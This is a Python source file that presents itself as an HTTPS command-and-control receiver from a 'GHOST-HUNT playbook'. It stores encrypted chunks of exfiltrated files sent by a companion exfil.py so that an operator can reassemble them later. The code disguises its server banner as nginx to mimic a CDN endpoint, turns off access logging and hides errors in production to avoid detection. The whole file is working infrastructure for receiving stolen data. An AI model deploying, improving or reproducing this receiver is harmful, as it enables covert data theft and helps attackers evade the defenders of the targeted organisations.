#!/usr/bin/env python3
"""HTTPS C2 receiver (GHOST-HUNT playbook 12.1).

Deployed by bootstrap-server.sh to /opt/c2/handler.py and served behind nginx on
127.0.0.1:8080. Also runs standalone for the local smoke test
(test/local_harness.py) — TLS terminates at nginx in production, so the handler
itself is plain HTTP by design.

Keyless by design: exfil.py encrypts a whole file into ONE Fernet token and
slices it, so each POSTed body is an opaque, already-encrypted slice. This
handler stores those slices exactly as received (encrypted-at-rest on the C2
box — the handler process never holds the key and cannot decrypt what it
stores), and pull.py reassembles + decrypts on the operator side.

Config (env vars):
    C2_EXFIL_DIR   incoming chunk directory  (default /opt/c2/incoming)
    C2_LISTEN      bind host:port            (default 127.0.0.1:8080)
    C2_DEBUG       set to 1 to log handler errors to stderr and echo them in
                   the 500 body (lab/harness only — keep unset in production
                   so failures stay silent)
"""

import hashlib
import os
import re
import traceback
from http.server import BaseHTTPRequestHandler, HTTPServer

EXFIL_DIR: str = os.environ.get("C2_EXFIL_DIR", "/opt/c2/incoming")
LISTEN: str = os.environ.get("C2_LISTEN", "127.0.0.1:8080")
DEBUG: bool = os.environ.get("C2_DEBUG") == "1"


class H(BaseHTTPRequestHandler):
    # OpsSec: don't leak the Python/BaseHTTP server banner on a CDN-mimic endpoint
    server_version = "nginx"
    sys_version = ""

    def do_POST(self) -> None:
        try:
            clen: int = int(self.headers.get("Content-Length", 0))
            body: bytes = self.rfile.read(clen)
            if not body:
                raise ValueError("empty body")
            # Sanitize header-supplied ids — they end up in a filesystem path
            cid: str = re.sub(r"[^A-Za-z0-9_-]", "", self.headers.get("X-Chunk-ID") or "")
            cid = cid[:64] or hashlib.sha256(body).hexdigest()[:16]
            seq: str = re.sub(r"[^0-9]", "", self.headers.get("X-Chunk-Seq") or "0") or "0"
            seq = seq[:9]  # cap filename component length (999,999,999 chunks ≫ any real file)
            os.makedirs(EXFIL_DIR, exist_ok=True)
            with open(f"{EXFIL_DIR}/{cid}_{seq}.bin", "wb") as f:
                f.write(body)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        except Exception as exc:
            if DEBUG:
                traceback.print_exc()  # lands on stderr -> captured by the harness
            try:
                self.send_response(500)
                self.end_headers()
                if DEBUG:
                    self.wfile.write(str(exc).encode("utf-8", "replace"))
            except Exception:  # noqa: S110 — client already gone, silent by design (prod)
                pass

    def do_GET(self) -> None:
        self.send_response(404)
        self.end_headers()

    def log_message(self, format: str, *args: object) -> None:
        pass  # silent — no access logging


if __name__ == "__main__":
    host: str
    port: str
    host, port = LISTEN.rsplit(":", 1)
    HTTPServer((host, int(port)), H).serve_forever()
